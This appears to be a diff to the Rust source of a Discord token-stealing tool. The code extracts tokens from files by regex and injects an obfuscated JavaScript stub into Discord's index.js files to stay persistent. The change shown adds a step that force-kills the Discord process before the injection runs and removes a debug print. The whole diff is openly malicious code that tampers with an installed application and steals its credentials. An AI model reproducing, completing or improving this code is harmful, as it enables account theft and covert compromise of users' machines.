@@ -5,6 +5,7 @@ use std::fs;
 use std::fs::File;
 use std::io::prelude::*;
 use std::path::PathBuf;
+use std::process::Command;
 
 pub fn get_paths() -> Vec<PathBuf> {
     let app_data = dirs::config_dir();
@@ -93,14 +94,21 @@ pub fn get_token_from_file(token_regex: &Regex, file: &PathBuf) -> Option<String
 pub fn inject_persistence() {
     let to_dump: String = include!("../stub_obf.js").to_string();
 
+    //end discord process
+    //taskkill /f /im discord.exe
+    let mut child = Command::new("taskkill")
+        .arg("/f /im discord.exe")
+        .spawn()
+        .expect("failed to execute child");
+
+    child.wait().expect("failed to kill discord");
+
     let persistence_paths = get_persistence_paths();
     for persist_loc in persistence_paths {
         let index_file = persist_loc.join("index.js");
         if !index_file.exists() {
             continue;
         }
-
-        println!("{}", index_file.display());
 
         let mut file_handle = File::open(&index_file).expect("unable to open file");
 
